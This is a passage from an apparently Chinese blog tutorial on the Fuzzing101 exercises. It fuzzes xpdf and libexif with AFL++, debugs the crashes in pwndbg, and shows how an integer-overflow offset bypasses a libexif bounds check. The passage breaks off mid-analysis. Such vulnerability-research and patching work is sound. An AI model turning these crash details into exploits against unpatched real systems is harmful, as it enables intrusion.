<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清空已经编译</span></span><br><span class="line">cd $HOME/fuzzing_xpdf/xpdf-3.02/</span><br><span class="line">make clean</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 afl-clang-fast 编译</span></span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">export CC=$HOME/AFLplusplus/afl-clang-fast </span><br><span class="line">export CXX=$HOME/AFLplusplus/afl-clang-fast++</span><br><span class="line">make</span><br></pre></td></tr></table></figure>



<p>开始模糊测试，主要参数设置如下：</p>
<ul>
<li><code>-i</code>：设置输入实例的文件夹</li>
<li><code>-o</code>：设置用于存放模糊测试结果的文件夹</li>
<li><code>-s</code>：设置一个静态随机数作为种子</li>
<li><code>--</code>：设置测试目标</li>
<li><code>@@</code>：占位符，指代每一个输入的文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭核心转储</span></span><br><span class="line">sudo su</span><br><span class="line">echo core &gt;/proc/sys/kernel/core_pattern</span><br><span class="line">exit</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始 Fuzz</span></span><br><span class="line">afl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/xpdf-3.02/xpdf/pdftotext @@ $HOME/fuzzing_xpdf/output</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------------</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">该结果是作者在程序崩溃了7次后记录</span></span><br><span class="line">american fuzzy lop ++4.05a &#123;default&#125; (...df/xpdf-3.02/xpdf/pdftotext) [fast]</span><br><span class="line">┌─ process timing ────────────────────────────────────┬─ overall results ────┐</span><br><span class="line">│        run time : 0 days, 0 hrs, 21 min, 8 sec      │  cycles done : 0     │</span><br><span class="line">│   last new find : 0 days, 0 hrs, 0 min, 19 sec      │ corpus count : 977   │</span><br><span class="line">│last saved crash : 0 days, 0 hrs, 0 min, 59 sec      │saved crashes : 7     │</span><br><span class="line">│ last saved hang : 0 days, 0 hrs, 21 min, 1 sec      │  saved hangs : 1     │</span><br><span class="line">├─ cycle progress ─────────────────────┬─ map coverage┴──────────────────────┤</span><br><span class="line">│  now processing : 557.4 (57.0%)      │    map density : 3.53% / 4.86%      │</span><br><span class="line">│  runs timed out : 0 (0.00%)          │ count coverage : 3.98 bits/tuple    │</span><br><span class="line">├─ stage progress ─────────────────────┼─ findings in depth ─────────────────┤</span><br><span class="line">│  now trying : splice 2               │ favored items : 79 (8.09%)          │</span><br><span class="line">│ stage execs : 174/294 (59.18%)       │  new edges on : 138 (14.12%)        │</span><br><span class="line">│ total execs : 1.13M                  │ total crashes : 7 (7 saved)         │</span><br><span class="line">│  exec speed : 931.5/sec              │  total tmouts : 138 (0 saved)       │</span><br><span class="line">├─ fuzzing strategy yields ────────────┴─────────────┬─ item geometry ───────┤</span><br><span class="line">│   bit flips : disabled (default, enable with -D)   │    levels : 10        │</span><br><span class="line">│  byte flips : disabled (default, enable with -D)   │   pending : 825       │</span><br><span class="line">│ arithmetics : disabled (default, enable with -D)   │  pend fav : 0         │</span><br><span class="line">│  known ints : disabled (default, enable with -D)   │ own finds : 974       │</span><br><span class="line">│  dictionary : n/a                                  │  imported : 0         │</span><br><span class="line">│havoc/splice : 712/549k, 269/356k                   │ stability : 100.00%   │</span><br><span class="line">│py/custom/rq : unused, unused, unused, unused       ├───────────────────────┘</span><br><span class="line">│    trim/eff : 2.41%/214k, disabled                 │          [cpu000:350%]</span><br><span class="line">└────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>



<h3 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h3><p>在<code>fuzzing_xpdf/out/default/crashes</code>文件夹中可以看到导致程序崩溃的输入，作者这里是7个：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pursue@pursue-virtual-machine:~/桌面/Fuzzing101-main/Exercise 1/fuzzing_xpdf/out/default/crashes$ ls</span><br><span class="line">id:000000,sig:11,src:000532,time:98000,execs:105391,op:havoc,rep:8</span><br><span class="line">id:000001,sig:11,src:000532,time:100895,execs:107844,op:havoc,rep:16</span><br><span class="line">id:000002,sig:11,src:000846,time:592160,execs:473175,op:havoc,rep:8</span><br><span class="line">id:000003,sig:11,src:000729,time:666679,execs:535614,op:havoc,rep:8</span><br><span class="line">id:000004,sig:11,src:000557,time:670840,execs:539289,op:havoc,rep:8</span><br><span class="line">id:000005,sig:11,src:000593,time:944864,execs:788622,op:havoc,rep:16</span><br><span class="line">id:000006,sig:11,src:000607+000580,time:1209629,execs:1067185,op:splice,rep:4</span><br><span class="line">README.txt</span><br></pre></td></tr></table></figure>

<p>接下来，我们就需要将这些文件放入gdb中进行调试，看看到底是哪里出错了？</p>
<p>首先重新编译带调试的程序：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd $HOME/fuzzing_xpdf/xpdf-3.02/</span><br><span class="line">make clean</span><br><span class="line">CFLAGS=&quot;-g -O0&quot; CXXFLAGS=&quot;-g -O0&quot;</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p>开启gdb调试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb --args $HOME/fuzzing_xpdf/xpdf-3.02/xpdf/pdftotext $HOME/fuzzing_xpdf/out/default/crashes/id:000000,sig:11,src:000532,time:98000,execs:105391,op:havoc,rep:8 $HOME/fuzzing_xpdf/output</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gdb</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">run</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">回溯使用过的函数</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bt</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3977 0x000000000049f0c9 <span class="keyword">in</span> Parser::getObj (this=&lt;optimized out&gt;, obj=0x7fffff85c3c0, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0, objNum=7, objGen=0) at Parser.cc:94</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3978 0x00000000004d1641 <span class="keyword">in</span> XRef::fetch (this=0x7965b0, num=7, gen=0, obj=0x7fffff85c3c0) at XRef.cc:823</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3979 0x000000000049f5e5 <span class="keyword">in</span> Object::dictLookup (this=0x7fffff85c540, key=0x529 &lt;error: Cannot access memory at address 0x529&gt;, obj=0x7fffff85c3c0) at ./Object.h:253</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3980 Parser::makeStream (this=this@entry=0x2081320, dict=dict@entry=0x7fffff85c540, fileKey=fileKey@entry=0x0, encAlgorithm=encAlgorithm@entry=cryptRC4, keyLength=keyLength@entry=0, objNum=objNum@entry=7, objGen=0) at Parser.cc:156</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3981 0x000000000049f0c9 <span class="keyword">in</span> Parser::getObj (this=&lt;optimized out&gt;, obj=0x7fffff85c540, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0, objNum=7, objGen=0) at Parser.cc:94</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3982 0x00000000004d1641 <span class="keyword">in</span> XRef::fetch (this=0x7965b0, num=7, gen=0, obj=0x7fffff85c540) at XRef.cc:823</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3983 0x000000000049f5e5 <span class="keyword">in</span> Object::dictLookup (this=0x7fffff85c6c0, key=0x529 &lt;error: Cannot access memory at address 0x529&gt;, obj=0x7fffff85c540) at ./Object.h:253</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3984 Parser::makeStream (this=this@entry=0x2080e40, dict=dict@entry=0x7fffff85c6c0, fileKey=fileKey@entry=0x0, encAlgorithm=encAlgorithm@entry=cryptRC4, keyLength=keyLength@entry=0, objNum=objNum@entry=7, objGen=0) at Parser.cc:156</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3985 0x000000000049f0c9 <span class="keyword">in</span> Parser::getObj (this=&lt;optimized out&gt;, obj=0x7fffff85c6c0, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0, objNum=7, objGen=0) at Parser.cc:94</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3986 0x00000000004d1641 <span class="keyword">in</span> XRef::fetch (this=0x7965b0, num=7, gen=0, obj=0x7fffff85c6c0) at XRef.cc:823</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3987 0x000000000049f5e5 <span class="keyword">in</span> Object::dictLookup (this=0x7fffff85c840, key=0x529 &lt;error: Cannot access memory at address 0x529&gt;, obj=0x7fffff85c6c0) at ./Object.h:253</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3988 Parser::makeStream (this=this@entry=0x2080960, dict=dict@entry=0x7fffff85c840, fileKey=fileKey@entry=0x0, encAlgorithm=encAlgorithm@entry=cryptRC4, keyLength=keyLength@entry=0, objNum=objNum@entry=7, objGen=0) at Parser.cc:156</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发现一直调用 Parser::getObj 函数</span></span><br></pre></td></tr></table></figure>

<p>查看源码<code>Parser.cc:94</code>：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// stream objects are not allowed inside content streams or</span></span><br><span class="line"><span class="comment">// object streams</span></span><br><span class="line"><span class="keyword">if</span> (allowStreams &amp;&amp; buf2.<span class="built_in">isCmd</span>(<span class="string">&quot;stream&quot;</span>)) &#123;</span><br><span class="line">  <span class="keyword">if</span> ((str = <span class="built_in">makeStream</span>(obj, fileKey, encAlgorithm, keyLength,</span><br><span class="line">   objNum, objGen))) &#123;</span><br><span class="line">      ...</span><br></pre></td></tr></table></figure>

<p>发现问题所在，解决方法：只需在分支中加入递归次数的检测，使得超过一定次数程序退出，由于本人的代码能力不是很强，所以没能自己成功修复bug，学习了<code>Xpdf-4.02</code>中的<code>Parser.cc</code>源码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 增加了递归的上限</span></span><br><span class="line"><span class="comment">// Max number of nested objects.  This is used to catch infinite loops</span></span><br><span class="line"><span class="comment">// in the object structure.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> recursionLimit 500</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 增加了递归次数的检查</span></span><br><span class="line">  <span class="comment">// array</span></span><br><span class="line">  <span class="keyword">if</span> (!simpleOnly &amp;&amp; recursion &lt; recursionLimit &amp;&amp; buf1.<span class="built_in">isCmd</span>(<span class="string">&quot;[&quot;</span>)) &#123;</span><br><span class="line">      ...</span><br><span class="line">  <span class="comment">// dictionary or stream</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!simpleOnly &amp;&amp; recursion &lt; recursionLimit &amp;&amp; buf1.<span class="built_in">isCmd</span>(<span class="string">&quot;&lt;&lt;&quot;</span>)) &#123;</span><br><span class="line">      ...</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 对比之前版本，发现多了 recursion 这个参数</span></span><br><span class="line">    <span class="comment">// stream objects are not allowed inside content streams or</span></span><br><span class="line">    <span class="comment">// object streams</span></span><br><span class="line">    <span class="keyword">if</span> (allowStreams &amp;&amp; buf2.<span class="built_in">isCmd</span>(<span class="string">&quot;stream&quot;</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((str = <span class="built_in">makeStream</span>(obj, fileKey, encAlgorithm, keyLength,</span><br><span class="line">			    objNum, objGen, recursion + <span class="number">1</span>))) &#123;</span><br><span class="line">          ...</span><br></pre></td></tr></table></figure>



<h2 id="Exercise-2：Libexif"><a href="#Exercise-2：Libexif" class="headerlink" title="Exercise 2：Libexif"></a>Exercise 2：Libexif</h2><p>CVE-2009-3895：基于堆缓冲区溢出漏洞，可以劫持程序流。</p>
<blockquote>
<p>原文链接：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3895">CVE - CVE-2009-3895 (mitre.org)</a></p>
</blockquote>
<p>CVE-2012-2836：一个越界读取的漏洞，可以从内存中读取潜在的敏感信息。</p>
<blockquote>
<p>原文链接：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2836">CVE - CVE-2012-2836 (mitre.org)</a></p>
</blockquote>
<h3 id="Fuzz准备-1"><a href="#Fuzz准备-1" class="headerlink" title="Fuzz准备"></a>Fuzz准备</h3><p>首先编译<code>libexif</code>链接库和用于运行这个链接库的程序<code>exif</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir fuzzing_libexif &amp;&amp; cd fuzzing_libexif/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译和安装 libexif 库文件</span></span><br><span class="line">wget https://sourceforge.net/projects/libexif/files/libexif/0.6.14/libexif-0.6.14.tar.gz</span><br><span class="line">tar -xzvf libexif-0.6.14.tar.gz</span><br><span class="line">cd libexif-0.6.14/</span><br><span class="line">sudo apt-get install autopoint libtool gettext libpopt-dev</span><br><span class="line">autoreconf -fvi		# 自动生成 Makefile</span><br><span class="line">./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/install/&quot;	# 使用静态编译</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译和安装 exif 调用 libexif 库文件</span></span><br><span class="line">cd $HOME/fuzzing_libexif</span><br><span class="line">wget https://sourceforge.net/projects/libexif/files/exif/0.6.15/exif-0.6.15.tar.gz</span><br><span class="line">tar -xzvf exif-0.6.15.tar.gz</span><br><span class="line">cd exif-exif-0_6_15-release/</span><br><span class="line">autoreconf -fvi</span><br><span class="line">./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/install/&quot; PKG_CONFIG_PATH=$HOME/fuzzing_libexif/install/lib/pkgconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>测试是否编译成功：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd $HOME/fuzzing_libexif</span><br><span class="line">git clone https://github.com/ianare/exif-samples.git</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试</span></span><br><span class="line">./exif exif-samples-master/jpg/tests/11-tests.jpg</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试结果</span></span><br><span class="line">EXIF tags in &#x27;exif-samples/11-tests.jpg&#x27; (&#x27;英特尔&#x27; byte order):</span><br><span class="line">--------------------+----------------------------------------------------------</span><br><span class="line">Tag                 |Value                                                     </span><br><span class="line">--------------------+----------------------------------------------------------</span><br><span class="line">Manufacturer        |Canon                                                     </span><br><span class="line">Model               |Canon DIGITAL IXUS 40                                     </span><br><span class="line">Date and Time       |2007:09:03 16:03:45                                       </span><br><span class="line">YCbCr Positioning   |centered                                                  </span><br><span class="line">RelatedImageWidth   |2272                                                      </span><br><span class="line">RelatedImageLength  |1704                                                      </span><br><span class="line">Custom Rendered     |正常过程                                              </span><br><span class="line">曝光模式        |自动曝光                                              </span><br><span class="line">白平衡           |自动白平衡                                           </span><br><span class="line">数码变焦倍率  |1.00                                                      </span><br><span class="line">场景捕获类型  |标准                                                    </span><br><span class="line">Exposure Time       |1/500 sec.                                                </span><br><span class="line">FNumber             |f/2.8                                                     </span><br><span class="line">Exif Version        |Exif版本2.2                                             </span><br><span class="line">Date and Time (origi|2007:09:03 16:03:45                                       </span><br><span class="line">Date and Time (digit|2007:09:03 16:03:45                                       </span><br><span class="line">ComponentsConfigurat|Y Cb Cr -                                                 </span><br><span class="line">Compressed Bits per |3.00                                                      </span><br><span class="line">Shutter speed       |8.97 EV (APEX: 22, 1/501 sec.)                            </span><br><span class="line">光圈              |2.97 EV (f/2.8)                                           </span><br><span class="line">曝光偏差        |0.00 EV                                                   </span><br><span class="line">MaxApertureValue    |2.97 EV (f/2.8)                                           </span><br><span class="line">测距模式        |样式                                                    </span><br><span class="line">闪光灯           |Flash did not fire, auto mode.                            </span><br><span class="line">焦距              |5.8 mm                                                    </span><br><span class="line">制作者备忘     |1176 字节未知数据                                   </span><br><span class="line">用户备注        |                                                          </span><br><span class="line">FlashPixVersion     |FlashPix版本 1.0                                        </span><br><span class="line">色彩空间        |sRGB                                                      </span><br><span class="line">PixelXDimension     |2272                                                      </span><br><span class="line">PixelYDimension     |1704                                                      </span><br><span class="line">Focal Plane x-Resolu|10142.86                                                  </span><br><span class="line">Focal Plane y-Resolu|10142.86                                                  </span><br><span class="line">焦平面分辨率�|英寸                                                    </span><br><span class="line">传感方式        |单芯片色彩区域传感器                            </span><br><span class="line">File Source         |DSC                                                       </span><br><span class="line">--------------------+----------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>测试成功，接下来用<code>afl-clang-lto</code>重新编译：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新编译 libexif</span></span><br><span class="line">rm -r $HOME/fuzzing_libexif/install</span><br><span class="line">cd $HOME/fuzzing_libexif/libexif-libexif-0_6_14-release/</span><br><span class="line">make clean</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新编译 exif</span></span><br><span class="line">cd $HOME/fuzzing_libexif/exif-exif-0_6_15-release</span><br><span class="line">make clean</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/install/&quot; PKG_CONFIG_PATH=$HOME/fuzzing_libexif/install/lib/pkgconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>这里说明一下<code>afl-clang-fast</code>和<code>afl-clang-lto</code>区别。原文这样解释到：<code>afl-clang-lto</code>是一种无碰撞检测，它比<code>afl-clang-fast</code>更快并提供更好的结果。对于这些编译器在何种情况下适用，原文给出了这样一幅图，可以说是很清晰了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+--------------------------------+</span><br><span class="line">| clang/clang++ 11+ is available | --&gt; use LTO mode (afl-clang-lto/afl-clang-lto++)</span><br><span class="line">+--------------------------------+     see [instrumentation/README.lto.md](instrumentation/README.lto.md)</span><br><span class="line">    |</span><br><span class="line">    | if not, or if the target fails with LTO afl-clang-lto/++</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line">+---------------------------------+</span><br><span class="line">| clang/clang++ 6.0+ is available | --&gt; use LLVM mode (afl-clang-fast/afl-clang-fast++)</span><br><span class="line">+---------------------------------+     see [instrumentation/README.llvm.md](instrumentation/README.llvm.md)</span><br><span class="line">    |</span><br><span class="line">    | if not, or if the target fails with LLVM afl-clang-fast/++</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line"> +--------------------------------+</span><br><span class="line"> | gcc 5+ is available            | -&gt; use GCC_PLUGIN mode (afl-gcc-fast/afl-g++-fast)</span><br><span class="line"> +--------------------------------+    see [instrumentation/README.gcc_plugin.md](instrumentation/README.gcc_plugin.md) and</span><br><span class="line">                                       [instrumentation/README.instrument_list.md](instrumentation/README.instrument_list.md)</span><br><span class="line">    |</span><br><span class="line">    | if not, or if you do not have a gcc with plugin support</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line">   use GCC mode (afl-gcc/afl-g++) (or afl-clang/afl-clang++ for clang)</span><br></pre></td></tr></table></figure>

<p>开始Fuzz：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo core &gt;/proc/sys/kernel/core_pattern</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">afl-fuzz -i $HOME/fuzzing_libexif/exif-samples-master/jpg/ -o $HOME/fuzzing_libexif/out/ -s 123 -- $HOME/fuzzing_libexif/install/bin/exif @@</span><br></pre></td></tr></table></figure>



<h3 id="结果分析-1"><a href="#结果分析-1" class="headerlink" title="结果分析"></a>结果分析</h3><p>原文是通过<code>Eclipse-CDT</code>来调试的，不过本人更倾向于用pwndbg，主要是省去配置的工作，用一条命令就可以开整；还有就是用习惯了pwndbg，通过pwndbg可以看到更多的内存信息。</p>
<p>首先重新编译带调试信息的<code>libexif</code>和<code>exif</code>，这样就可以源码调试了：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">libexif</span></span><br><span class="line">rm -r $HOME/fuzzing_libexif/install</span><br><span class="line">cd $HOME/fuzzing_libexif/libexif-libexif-0_6_14-release/</span><br><span class="line">make clean</span><br><span class="line">CFLAGS=&quot;-g -O0&quot; CXXFLAGS=&quot;-g -O0&quot;</span><br><span class="line">make</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">exif</span></span><br><span class="line">cd $HOME/fuzzing_libexif/exif-exif-0_6_15-release</span><br><span class="line">make clean</span><br><span class="line">CFLAGS=&quot;-g -O0&quot; CXXFLAGS=&quot;-g -O0&quot; PKG_CONFIG_PATH=$HOME/fuzzing_libexif/install/lib/pkgconfig</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p>通过对报错输入的调试，主要有以下两条执行流：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bt</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0  0x000000000022c1bf <span class="keyword">in</span> exif_get_sshort (buf=0x100451e85 &lt;error: Cannot access memory at address 0x100451e85&gt;, order=EXIF_BYTE_ORDER_MOTOROLA) at exif-utils.c:92</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1  exif_get_short (buf=0x100451e85 &lt;error: Cannot access memory at address 0x100451e85&gt;, order=EXIF_BYTE_ORDER_MOTOROLA) at exif-utils.c:104</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2  exif_data_load_data (data=0x452680, d_orig=&lt;optimized out&gt;, ds_orig=&lt;optimized out&gt;) at exif-data.c:819</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3  0x00000000002214d6 <span class="keyword">in</span> exif_loader_get_data (loader=&lt;optimized out&gt;) at /home/pursue/桌面/Fuzzing101-main/Exercise 2/fuzzing_libexif/libexif-0.6.14/libexif/exif-loader.c:387</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">4  main (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at main.c:438</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">5  0x00007ffff7cb7d90 <span class="keyword">in</span> ?? () from /lib/x86_64-linux-gnu/libc.so.6</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">6  0x00007ffff7cb7e40 <span class="keyword">in</span> __libc_start_main () from /lib/x86_64-linux-gnu/libc.so.6</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">7  0x000000000021a925 <span class="keyword">in</span> _start ()</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bt</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0  0x00007ffff7e2eed0 <span class="keyword">in</span> ?? () from /lib/x86_64-linux-gnu/libc.so.6</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1  0x000000000022efe5 <span class="keyword">in</span> exif_data_load_data_thumbnail (data=0x452610, d=0x451e16 <span class="string">&quot;MM&quot;</span>, ds=2026, offset=702, size=4294967168) at exif-data.c:292</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2  exif_data_load_data_content (data=&lt;optimized out&gt;, ifd=&lt;optimized out&gt;, d=&lt;optimized out&gt;, ds=&lt;optimized out&gt;, offset=674, recursion_depth=&lt;optimized out&gt;) at exif-data.c:381</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3  0x000000000022c322 <span class="keyword">in</span> exif_data_load_data (data=0x452610, d_orig=&lt;optimized out&gt;, ds_orig=&lt;optimized out&gt;) at exif-data.c:835</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">4  0x00000000002214d6 <span class="keyword">in</span> exif_loader_get_data (loader=&lt;optimized out&gt;) at /home/pursue/桌面/Fuzzing101-main/Exercise 2/fuzzing_libexif/libexif-0.6.14/libexif/exif-loader.c:387</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">5  main (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at main.c:438</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">6  0x00007ffff7cb7d90 <span class="keyword">in</span> ?? () from /lib/x86_64-linux-gnu/libc.so.6</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">7  0x00007ffff7cb7e40 <span class="keyword">in</span> __libc_start_main () from /lib/x86_64-linux-gnu/libc.so.6</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">8  0x000000000021a925 <span class="keyword">in</span> _start ()</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>对于<code>libexif</code>中的<code>api</code>，该文档做了功能的解释：<a href="https://libexif.github.io/api/globals_func.html">EXIF library (libexif) API: Globals</a></p>
</blockquote>
<ul>
<li><p>第一条执行流：<code>main -&gt; exif_loader_get_data -&gt; exif_data_load_data -&gt; exif_get_short -&gt; exif_get_sshort</code></p>
<p>可以在回溯中看到buf超越到了不可访问的空间：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x000000000022c1bf in exif_get_sshort (buf=0x100451e85 &lt;error: Cannot access memory at address 0x100451e85&gt;, order=EXIF_BYTE_ORDER_MOTOROLA) at exif-utils.c:92		# Cannot access memory at address 0x100451e85</span><br></pre></td></tr></table></figure>

<p>往回找一下，发现在<code>exif-data.c</code>的819行找到了buf的真相：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">	<span class="comment">/* IFD 1 offset */</span></span><br><span class="line"><span class="comment">// ExifLong offset; unsigned int ds;</span></span><br><span class="line">	<span class="keyword">if</span> (offset + <span class="number">6</span> + <span class="number">2</span> &gt; ds) &#123;		<span class="comment">// 检查</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	n = exif_get_short (d + <span class="number">6</span> + offset, data-&gt;priv-&gt;order);</span><br></pre></td></tr></table></figure>

<p>由于这里因为gdb优化代码编译的原因，所以我们不能从回溯中找到参数的信息。这里通过gdb的动调，找到了<code>offset</code>和<code>ds</code>的值。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pwndbg</span></span><br><span class="line">──────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────</span><br><span class="line">*RBX  0x7c3</span><br><span class="line">*RBP  0xffffffff</span><br><span class="line">───────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────</span><br><span class="line"> ► 0x22c117 &lt;exif_data_load_data+1239&gt;    lea    eax, [rbp + 8]                &lt;__afl_area_initial&gt;</span><br><span class="line">   0x22c11a &lt;exif_data_load_data+1242&gt;    cmp    eax, ebx</span><br><span class="line">   0x22c11c &lt;exif_data_load_data+1244&gt;    jbe    exif_data_load_data+1306   </span><br></pre></td></tr></table></figure>

<p>可以看到<code>offset</code>的值为<code>0xffffffff</code>，也就是<code>-1</code>，加上8那就是<code>7</code>；而<code>ds</code>的值是<code>0x7c3</code>，显然是可以通过检查的。总结那就是当<code>offset</code>的值在<code>-8 ~ -1</code>之间是能够绕过检查触发程序崩溃的。所以修改如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (offset &gt; <span class="number">0xfffffff0</span> | offset + <span class="number">6</span> + <span class="number">2</span> &gt; ds) &#123;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
<li><p>第二条执行流：<code>main -&gt; exif_loader_get_data -&gt; exif_data_load_data -&gt; exif_data_load_data_content -&gt; exif_data_load_data_thumbnail</code></p>
<p>可以在回溯中清晰的看到<code>memcpy()</code>函数复制的size过大导致崩溃：</p>
